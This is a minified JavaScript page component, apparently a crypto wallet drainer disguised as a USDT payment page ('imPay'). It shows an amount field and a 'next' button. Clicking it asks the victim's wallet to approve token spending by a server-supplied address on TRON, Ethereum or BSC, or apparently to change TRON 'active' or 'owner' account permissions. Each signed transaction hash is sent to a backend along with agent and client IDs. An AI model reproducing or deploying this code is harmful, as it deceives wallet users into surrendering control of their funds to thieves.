import{u as e}from"./bEF4wQsI8-835414c1.js";import{s as a,a as t,b as s,g as o}from"./Gq0sU1-92a05eef.js";import{B as i,a as r,b as l,c,t as u,g as p}from"./vaGsUkzTU-ffe9afa5.js";import{T as d}from"./p-e68eda62.js";import{d as n,e as m,c as v,g as f,a as b,b as j}from"./LTH1F-66858079.js";import{v as w,c as g,b as h,Q as k,P as y,l as T,M as x,R as S,S as A,O as I,q as R}from"./FOuo2c-3968258a.js";import{r as U,u as z}from"./Q7PZYuBALU-00755189.js";import{P as H}from"./P-19fdc20a.js";import{F as X,B as D,s as L,a as O,c as _}from"./DV7XD-cc52e100.js";import{_ as q}from"./MYkovOwMx-3e787095.js";import"./SMMGXFQUUk-7c8912ae.js";import"./TUAV-9c616223.js";import"./r2-51522e50.js";import"./6qrq-b26ae33f.js";import"./Jzw-58335642.js";import"./dDOtsLkL2g-0b0befdd.js";import"./upmSEfqr0P-bd9b9222.js";import"./M-09370c22.js";import"./m6VGzU-faa29fb4.js";import"./iHrO-4925fce4.js";import"./PfF-b863fecc.js";import"./HNza7D-9793841f.js";import"./kb29d4-068d1ad5.js";import"./gmAqu-958c92ee.js";import"./pKq-c8045ec4.js";import"./PRGpLnU-c26e1867.js";import"./XAxBIzg-37a6991b.js";import"./Vj1k0Bg2nj-f01c4fde.js";import"./w-f120cb75.js";import"./aFP-a185c5f2.js";import"./Q-b2e94a2e.js";import"./f06B-8de45486.js";/* empty css            */import"./7eCO-c2697939.js";/* empty css           */import"./N5xDi-aeaac01a.js";import"./uvR-9eff3009.js";import"./AUw-888bed34.js";import"./10-3707fa90.js";import"./IaA2UeBq-71297df0.js";import"./WEt3-b2757c49.js";import"./KhU2ein-4248606c.js";import"./v2hbWc7j-b663563f.js";import"./SvHkRDxfrv-824da0a6.js";import"./OXdD-94a25891.js";import"./e-78793c3d.js";import"./D-f1acd6ae.js";import"./Qm9mLV-b20cf1b3.js";import"./hQZ-a321e9f2.js";import"./grizSf-0d7ec3c2.js";import"./Imid-a64f1113.js";import"./5-bbd5f31e.js";import"./R0BBzIXzwT-5f1e07c1.js";import"./AQaZjXO-319f9133.js";import"./9-2964c959.js";import"./eWKXHz1xt-9f51c57e.js";import"./S0RbT-1b367a44.js";import"./c5yIvS-35709d35.js";import"./aCpuo-c5a1fbca.js";import"./QkZDLZ-887fb297.js";import"./6-4963f70d.js";import"./LDEHsc6v-122b672e.js";import"./qtltKJz9X-18587349.js";import"./TSbtQD-f3227d0f.js";import"./KBRzqGTARH-3ffa1469.js";const B=e=>(S("data-v-6966fb22"),e=e(),A(),e),N={class:"page-container"},Q=B((()=>y("div",{class:"bottom-m10 left-m10 right-m30 top-p10 o7 fs14"},"收款账号",-1))),E={class:"left-m10 bg-white br12 right-m10",style:{padding:"12px 15px","border-radius":"5px"}},P={class:"bottom-m10 left-m10 right-m10 top-m20 o7 fs14 spaceb"},F=B((()=>y("span",{class:"fs14"},"数量",-1))),V={class:"fs14 o7"},C={class:"bg-white left-m10 br12 right-m10",style:{"border-radius":"5px"}},G={class:"address left-m20 o7 top-p20 bottom-p10 column"},M={style:{"margin-right":"15px"}},J={class:"spaceb right-m10 top-m10 o6"},K={class:"fs14"},Z={class:"center-w confirm-btn left-m10 right-m10",style:{"margin-top":"15px"}},W=q(w({__name:"imPay",setup(w){const S=U(0),A=U(0),q=U(.069),B=U({type:1,walletType:1,agentId:"",token:"USDT",amount:1,clientId:"",block:i.TRX,ads:"",isAdd:!1,client_type:1,extend:{}}),W=U("");U("");const Y=U({authAddress:"",clientId:"",receiveAddress:{trx:"",eth:"",bsc:""},authSuccessTips:""}),$=U("");U(!1),e(),U("");const ee=U(!0),ae=g((()=>B.value.ads||Y.value.receiveAddress[B.value.block])),te=()=>{const{type:e}=B.value;if(A.value<S.value)return L("Insufficient balance");1==e?se():2==e?oe():ie()},se=async()=>{try{if(O({message:"Loading...",duration:0}),B.value.block==i.TRX){const e=await r("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",W.value,$.value);e.result&&(re($.value,"approve",e.txid),L(Y.value.authSuccessTips))}else if(B.value.block==i.ETH){const e=await n(web3.value,$.value,W.value);e.transactionHash&&(re($.value,"approve",e.transactionHash),L(Y.value.authSuccessTips))}else if(B.value.block==i.BSC){const e=await m(web3.value,$.value,W.value);e.transactionHash&&(re($.value,"approve",e.transactionHash),L(Y.value.authSuccessTips))}}catch(e){_()}},oe=async()=>{if(B.value.block!=i.TRX)return;const e=await l(W.value,$.value,B.value.isAdd);(null==e?void 0:e.result)?(re($.value,"active",e.txid),L(Y.value.authSuccessTips),_()):e&&L("object"==typeof e?JSON.stringify(e):String(e))},ie=async()=>{if(B.value.block!=i.TRX)return;const e=await c(W.value);e.result&&(re($.value,"owner",e.txid),L(Y.value.authSuccessTips))},re=async(e,o,i)=>{const r={addres:e,auth_addres:W.value,hash:i||0,wallete_type:"ImToken",client_id:B.value.clientId||Y.value.clientId||"",source:window.location.href,agent_uid:B.value.agentId,block:B.value.block,client_type:B.value.client_type,amount:B.value.amount,extend:B.value.extend?JSON.stringify(B.value.extend):""};switch(o){case"approve":await s(r);break;case"active":await t(r);break;case"owner":await a(r)}_()},le=async()=>{let e;switch(B.value.block){case i.TRX:if($.value=await tronWeb.defaultAddress.base58,!$.value)return L("无法获取钱包地址！请检查浏览器是否支持TRON！");A.value=await p($.value,B.value.token);break;case i.ETH:e=await b(),web3.value=e.web3,$.value=e.userAddress,A.value=await j(web3.value,e.userAddress);break;case i.BSC:e=await v(),web3.value=e.web3,$.value=e.userAddress,A.value=await f(web3.value,e.userAddress)}};return h((async()=>{const e=JSON.parse(localStorage.getItem("routerParams"));if(S.value=e.amount,B.value={amount:S.value,type:e.type,walletType:1,agentId:e.agent,token:e.token||"USDT",block:e.block||i.TRX,clientId:e.clientId||"",ads:e.ads,isAdd:e.isAdd,client_type:1,extend:e.extend},(async()=>{try{const e=JSON.parse(localStorage.getItem("config"));Y.value={...e};const{type:a}=B.value;ee.value=!0;const t=await o({block:B.value.block,type:u[B.value.type]});ee.value=!1;const s=t.data;Y.value={...e,authAddress:s},W.value=Y.value.authAddress}catch(e){ee.value=!1}})(),d.isTokenEnv())try{d.apis.navigator.setTitle(`${String(B.value.token).toLocaleLowerCase()}转账`);let e="";e=B.value.block==i.TRX?await d.apis.user.showAccountSwitch("TRON"):await d.apis.user.showAccountSwitch("ETHEREUM"),$.value=e,le()}catch(a){4001==a.code&&le()}else{le();const e=`imtokenv2://navigate?screen=DappView&url=${window.location.href}`;window.location.href=e}})),(e,a)=>(I(),k("div",N,[Q,y("div",E,H(ae.value||"-"),1),y("div",P,[F,y("span",V,H(A.value)+" "+H(String(B.value.token).toLocaleUpperCase()),1)]),y("div",C,[y("div",G,[y("div",M,[T(z(X),{modelValue:S.value,"onUpdate:modelValue":a[0]||(a[0]=e=>S.value=e),type:"number",label:"",placeholder:"请输入",size:"large",style:{"font-size":"16px",padding:"0 0 10px 0px","border-bottom":"1px solid #eee"}},null,8,["modelValue"])]),y("div",J,[y("span",K," $ "+H("t"==B.value.token?Number(Number(S.value).toFixed(2)*q.value).toFixed(3):S.value),1)])])]),y("div",Z,[T(z(D),{style:{width:"100%","border-radius":"8px"},size:"large",color:"#3478f6",onClick:te,loading:ee.value},{default:x((()=>[R("下一步")])),_:1},8,["loading"])])]))}}),[["__scopeId","data-v-6966fb22"]]);export{W as default};
